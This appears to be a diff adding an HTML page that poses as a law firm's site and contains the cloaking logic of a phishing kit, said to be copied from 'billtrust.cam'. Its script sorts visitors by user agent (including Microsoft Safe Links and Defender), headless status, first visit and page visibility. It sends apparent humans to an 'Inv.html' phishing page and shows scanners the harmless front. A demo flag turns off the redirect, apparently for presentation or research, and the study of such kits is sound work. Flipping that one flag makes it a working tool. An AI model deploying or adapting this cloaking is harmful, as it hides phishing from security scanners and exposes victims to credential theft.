@@ -1,0 +1,288 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Legal Zahirco - Professional Legal Services</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+        
+        .container {
+            background: white;
+            border-radius: 20px;
+            padding: 60px 40px;
+            max-width: 600px;
+            width: 100%;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+            text-align: center;
+            opacity: 0;
+            animation: fadeIn 0.5s ease-in-out forwards;
+        }
+        
+        @keyframes fadeIn {
+            to { opacity: 1; }
+        }
+        
+        .logo {
+            width: 80px;
+            height: 80px;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            border-radius: 50%;
+            margin: 0 auto 30px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 40px;
+            color: white;
+        }
+        
+        h1 {
+            color: #333;
+            font-size: 32px;
+            margin-bottom: 15px;
+        }
+        
+        p {
+            color: #666;
+            font-size: 16px;
+            line-height: 1.6;
+            margin-bottom: 30px;
+        }
+        
+        .features {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
+            gap: 20px;
+            margin-top: 40px;
+        }
+        
+        .feature {
+            padding: 20px;
+            background: #f8f9fa;
+            border-radius: 10px;
+            transition: transform 0.3s;
+        }
+        
+        .feature:hover {
+            transform: translateY(-5px);
+        }
+        
+        .feature-icon {
+            font-size: 30px;
+            margin-bottom: 10px;
+        }
+        
+        .feature-title {
+            font-weight: bold;
+            color: #333;
+            font-size: 14px;
+        }
+        
+        .loading {
+            display: none;
+            margin-top: 30px;
+            color: #667eea;
+            font-size: 14px;
+        }
+        
+        .loading.active {
+            display: block;
+        }
+        
+        .spinner {
+            border: 3px solid #f3f3f3;
+            border-top: 3px solid #667eea;
+            border-radius: 50%;
+            width: 30px;
+            height: 30px;
+            animation: spin 1s linear infinite;
+            margin: 20px auto;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+    <!-- DEMO MODE INDICATOR -->
+    <div id="demoModeIndicator" style="position: fixed; top: 10px; right: 10px; background: #ff9800; color: white; 
+         padding: 10px 20px; border-radius: 8px; font-weight: bold; z-index: 9999; font-size: 12px; box-shadow: 0 4px 8px rgba(0,0,0,0.2);">
+        🎬 DEMO MODE ACTIVE
+    </div>
+    
+    <div class="container">
+        <div class="logo">⚖️</div>
+        <h1>Legal Zahirco</h1>
+        <p>Professional Legal Services</p>
+        <p>We provide comprehensive legal solutions for businesses and individuals. Our team of experienced attorneys is dedicated to protecting your rights and achieving the best outcomes.</p>
+        
+        <div class="features">
+            <div class="feature">
+                <div class="feature-icon">📋</div>
+                <div class="feature-title">Contract Law</div>
+            </div>
+            <div class="feature">
+                <div class="feature-icon">🏢</div>
+                <div class="feature-title">Corporate Law</div>
+            </div>
+            <div class="feature">
+                <div class="feature-icon">👨‍⚖️</div>
+                <div class="feature-title">Litigation</div>
+            </div>
+        </div>
+        
+        <div class="loading" id="loading">
+            <div class="spinner"></div>
+            <p>Verifying your access...</p>
+        </div>
+    </div>
+
+    <script>
+        // ============================================
+        // DEMO MODE: Set to true to show detection results instead of auto-redirect
+        // For presentation: Set to false for live demo
+        // ============================================
+        const DEMO_MODE = true; // Change to false for real redirect
+        
+        // Hide demo mode indicator if not in demo mode
+        if (!DEMO_MODE) {
+            const indicator = document.getElementById('demoModeIndicator');
+            if (indicator) indicator.style.display = 'none';
+        }
+        
+        // ============================================
+        // EXACT BILLTRUST.CAM DETECTION PATTERN
+        // ============================================
+        (function() {
+            // EXACT bot detection regex from billtrust.cam (Line 150)
+            const botRegex = /bot|google|yandex|baidu|bing|msn|duckduckbot|teoma|slurp|crawler|spider|robot|crawling|facebook/i;
+            
+            // Additional Microsoft-specific detection
+            const microsoftBots = /microsoft|office365|safelinks|outlook|defender|msnbot|bingbot|bingpreview/i;
+            
+            // Headless browser detection
+            const isHeadless = navigator.webdriver === true || 
+                             !navigator.plugins || 
+                             navigator.plugins.length === 0;
+            
+            // Combined User-Agent check
+            const userAgent = navigator.userAgent;
+            const isBotUA = botRegex.test(userAgent) || microsoftBots.test(userAgent);
+            
+            // Session storage check (first visit only)
+            const isFirstVisit = typeof(sessionStorage) !== 'undefined' && 
+                               sessionStorage.getItem('visited') !== 'y';
+            
+            // Visibility state check
+            const isVisible = document.visibilityState;
+            
+            console.log('Detection Results:');
+            console.log('- User Agent:', userAgent);
+            console.log('- Bot Detected (UA):', isBotUA);
+            console.log('- Headless:', isHeadless);
+            console.log('- First Visit:', isFirstVisit);
+            console.log('- Page Visible:', isVisible);
+            
+            // ============================================
+            // DECISION LOGIC - EXACT billtrust.cam pattern
+            // NO IP CHECK (billtrust.cam doesn't use IP checking)
+            // ============================================
+            
+            if (isBotUA === false && !isHeadless && isFirstVisit && isVisible) {
+                // REAL USER DETECTED
+                console.log('✅ REAL USER - Would redirect to Inv.html');
+                
+                if (DEMO_MODE) {
+                        // DEMO MODE: Show results instead of redirecting
+                        const loadingDiv = document.getElementById('loading');
+                        loadingDiv.innerHTML = `
+                            <div style="background: #d4edda; color: #155724; padding: 20px; border-radius: 10px; border: 2px solid #28a745; text-align: left;">
+                                <h3 style="margin: 0 0 15px 0; font-size: 18px;">✅ REAL USER DETECTED</h3>
+                                <div style="font-size: 14px; line-height: 1.8;">
+                                    <strong>Detection Results (EXACT billtrust.cam pattern):</strong><br>
+                                    ✅ User-Agent: Clean (no bot keywords)<br>
+                                    ✅ Headless Browser: No (real browser)<br>
+                                    ✅ First Visit: Yes (sessionStorage check)<br>
+                                    ✅ Page Visible: Yes (visibilityState check)<br>
+                                    <br>
+                                    <strong style="color: #28a745;">→ Would redirect to Inv.html in real attack</strong><br>
+                                    <small style="color: #666;">(Using EXACT billtrust.cam detection - NO IP check)</small><br>
+                                    <br>
+                                    <button onclick="window.location.href='./Inv.html'" 
+                                            style="background: #28a745; color: white; border: none; padding: 12px 24px; 
+                                                   border-radius: 6px; cursor: pointer; font-size: 14px; font-weight: bold;">
+                                        Manually Continue to Inv.html →
+                                    </button>
+                                </div>
+                            </div>
+                        `;
+                        loadingDiv.classList.add('active');
+                        return; // Don't redirect in demo mode
+                    }
+                    
+                    // Mark as visited
+                    sessionStorage.setItem('visited', 'y');
+                    
+                    // Show loading indicator
+                    document.getElementById('loading').classList.add('active');
+                    
+                    // Redirect to invoice page after 2 seconds
+                    setTimeout(function() {
+                        window.location.href = './Inv.html';
+                    }, 2000);
+                    
+                } else {
+                    // BOT/SECURITY SCANNER DETECTED
+                    console.log('🛡️ BOT/SCANNER DETECTED - Showing innocent page');
+                    console.log('Reasons:');
+                    if (isBotUA) console.log('  - Bot User-Agent detected');
+                    if (isHeadless) console.log('  - Headless browser detected');
+                    if (!isFirstVisit) console.log('  - Repeat visit detected');
+                    if (!isVisible) console.log('  - Page not visible');
+                    
+                    if (DEMO_MODE) {
+                        // DEMO MODE: Show bot detection results
+                        const loadingDiv = document.getElementById('loading');
+                        loadingDiv.innerHTML = `
+                            <div style="background: #f8d7da; color: #721c24; padding: 20px; border-radius: 10px; border: 2px solid #dc3545; text-align: left;">
+                                <h3 style="margin: 0 0 15px 0; font-size: 18px;">🛡️ BOT/SCANNER DETECTED</h3>
+                                <div style="font-size: 14px; line-height: 1.8;">
+                                    <strong>Detection Triggers (EXACT billtrust.cam pattern):</strong><br>
+                                    ${isBotUA ? '❌ Bot User-Agent detected<br>' : ''}
+                                    ${isHeadless ? '❌ Headless browser detected<br>' : ''}
+                                    ${!isFirstVisit ? '❌ Repeat visit detected (sessionStorage)<br>' : ''}
+                                    ${!isVisible ? '❌ Page not visible (visibilityState)<br>' : ''}
+                                    <br>
+                                    <strong style="color: #dc3545;">→ Phishing page hidden from scanner</strong><br>
+                                    <strong style="color: #dc3545;">→ Only innocent page visible</strong><br>
+                                    <small style="color: #666;">(Using EXACT billtrust.cam detection - NO IP check)</small>
+                                </div>
+                            </div>
+                        `;
+                        loadingDiv.classList.add('active');
+                    }
+                    
+                    // Stay on this innocent page
+                    // Bots see this clean legal services website
+                }
+            
+        })();
+    </script>
+</body>
+</html>
